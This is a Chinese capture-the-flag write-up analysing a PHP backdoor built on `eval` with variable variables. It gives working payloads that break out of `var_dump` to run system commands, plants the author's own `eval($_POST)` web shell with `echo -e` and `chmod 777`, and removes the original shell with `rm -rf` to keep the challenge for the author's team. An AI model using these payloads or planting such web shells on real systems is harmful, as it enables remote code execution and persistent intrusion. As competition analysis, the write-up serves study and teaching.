原创： 小煤球  合天智汇

参加完某某国赛，对比赛木马的分析与思考。从分析到利用接着删马。首先我们拿到题目是个sql注入通过各种姿势获得了一串字符，utf-7解码，得到木马的链接地址，访问可以得到木马的源代码。如下

<?php

show_source(__FILE__);

$a= @$_REQUEST['a'];

@eval("var_dump($$a);");

?>

我们的目的很简单，利用题目的木马写进自己的木马到别人的服务器，然后将题目提供的木马删除，这样我们就可以保证自己可以自己占据这个题目，不让别人刷分。在分析利用木马之前我们需要学习一点预备知识，如果下面的预备知识你知道的话，可以直接跳至分析部分。

####  

####

预备的知识

####

 **(1)木马中出现的函数**

show_source(filename,return) //显示文件源代码

eval(string$code) //将字符串当成php代码来执行

var_dump() //打印变量的相关信息，返回值为null

**(2)中单引号双引号的区别**

php中单引号中的变量不能被解析，双引号中的变量被解析。举个例子测试代码如下

<?PHP

$a="admin";

echo"normal is ".$a."</br>";

echo"sigle is".'$a'."</br>";

echo"double is"."$a"."</br>";

echo"mix1 is"."'$a'"."</br>";

echo"mix2 is".'"$a"';?>

输出结果为:

nomalisadmin.

sigleis$a

doubleisadmin

mix1 is 'admin'

mix2 is"$a"

 **(3)变量覆盖**

在ctf中经常看到$$,对于$$a,我们用代码来测试下,对测试结果进行分析。测试index.php代码如下，

访问http://127.0.0.1/test/index.php?a=b

<?php

$b=”HelloI am b”;

$a=$_GET[‘a’];

echo$$a;

?>

得到结果为HelloI am
b,首先$a=$_GET[‘a’],我们通过get传入的a=b，那么执行之后得到$a=‘b’;接着echo$$a;$a=b,从右向左先将$a替换成b，结果就变成了echo$b,故输出的结果就是变量b的值。如果我们想输出自定义的字符串我们可以这样进行访问。

http://127.0.0.1/test/index.php?a=a=”HELLOI AM A”

输出的结果就是在get中请求的字符串

 **(4)linuxecho 写入文件命令**

在linux中通常用-e参数来转义相关字符串，我们也做两个实验，首先我们linux输入命令

touchxiaomeiqiu.php

echo"<?phpeval($_POST['a']);?>"> xiaomeiqiu.php

cat xiaomeiqiu.php

  
![图片.png](https://image.3001.net/images/20180927/1538030728_5bac7c885bbc3.png!small)  

发现并不是我们想象的那样，echo遇到变量也会解析。这个时候我们可以用-e转义,

我们输入命令

touchxiaomeiqiu.php

echo-e "<?phpeval(\$_POST['a']);?>"> xiaomeiqiu.php

cat xiaomeiqiu.php

![图片.png](https://image.3001.net/images/20180927/1538030841_5bac7cf9d60e8.png!small)  

这样就可以将木马写入服务器了。通过上面这些操作我们已经可以将自己木马通过命令写入服务器，接下来我们如果知道木马的利用方式，让木马执行system（）命令，我们就可以将木马写入服务器。

分析

首先注意到木马中eval(“var_dump($$a);”)内部是双引号，根据前面所学的知识，双引号中的变量会被解析，eval()存在变量$$a,$a用户可控，根据前面的知识综合思考下，那也就是可能我们输入的他会当做php代码执行，假设没有var_dump()函数，函数将变为eval(“$$a”),根据前面的知识我们就能够利用这个木马——我们输入的字符串，他会当成php来执行。比如a=a=phpinfo();就可以执行（在函数为eval(“$$a”)）情况下，那么我们接下来的目的只需要解决var_dump()函数就行啦

对于var_dump函数，我们可以像sql注入那样来拼接语句来讲var_dump()闭合然后放入我们自己的PHP语句。我们具体实验下我们来做个试验，源代码就是本次分析的小马源代码，payload为a=a=1);print_r(2，post发包我们先看试验结果。

  
![图片.png](https://image.3001.net/images/20180927/1538030851_5bac7d038c101.png!small)  

不明显？我们让他执行ipconfig试试，payload为a=a=1);system(ifconfig测试结果如下

  
![图片.png](https://image.3001.net/images/20180927/1538030860_5bac7d0cadeda.png!small)  

也是可以的。先解释下第一个。第一个payload为a=a=1);print_r(2,带入程序，特别注意里面的双引号

1.首先将变量的值带出来:$$a=1);print_r(2

2.将$$a带入var_dump也就是var_dump(1);print_r(2);

3.最终的语句为eval(“var_dump(1);print_r(2);”);

4.php先将括号中的字符串当成php来执行，也就是先var_dump(1),接着print_r(2),所以才会有那样的结果int(1)2

我们来同样的分析第二个payload

1.首先将变量的值带出来:$$a=1);system(ipconfig

2.将$$a带入var_dump也就是var_dump(1);system(ipconfig);

3.最终的语句为eval(“var_dump(1);system(ipconfig);”);

php先执行var_dump(1)然后执行system(ipconfig);

我们可以接着利用前面学习的预备知识4将自己的木马写进去。

利用并写马

根据前面的分析学习我们得到最终shell的payload：a=a=1);system("echo-e '<?phpeval(\$_POST[2]);?>'>
xiaomeiqiu.php | chmod 777 xiaomeiqiu.php | touchxiaomeiqiu.php"

在文档的最后我们要提及另一种的利用方法，其实原理差不多，这里我直把payload贴出来，小伙伴们可以自己分析一下。

Payload：

a=a=system("echo'<?php eval($_POST[2]);?>' > minpeng.php | chmod
777minpeng.php | touch minpeng.php")&2=$_POST["B"]。

####  

####

删马

####

利用自己上传的木马将原来的马删除即可。可以用菜刀，或者是rm–rf命令，这样我们就可以在独刷这一题分数。

##  

##

总结

##

木马能被利用一大部分的原因还是在于双引号中变量可以解析，如果换成单引号或者是没有符号，这个木马将很难利用。

